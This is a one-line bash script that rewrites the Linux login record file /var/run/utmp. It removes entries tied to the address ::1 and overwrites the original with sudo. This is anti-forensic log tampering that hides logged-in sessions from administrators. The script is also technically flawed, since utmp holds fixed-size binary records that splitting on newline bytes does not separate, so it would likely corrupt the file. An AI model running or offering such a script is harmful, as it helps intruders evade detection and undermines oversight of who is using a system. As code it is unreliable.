#!/bin/bash

addr=::1; xxd -ps -c 1000000000 /var/run/utmp | sed 's/0a/\n/g' | grep -v `echo -n $addr | xxd -ps -c 1000` | sed 's/\n/0a/g' | xxd -r -ps > /tmp/utmp.new; sudo mv -f /tmp/utmp.new /var/run/utmp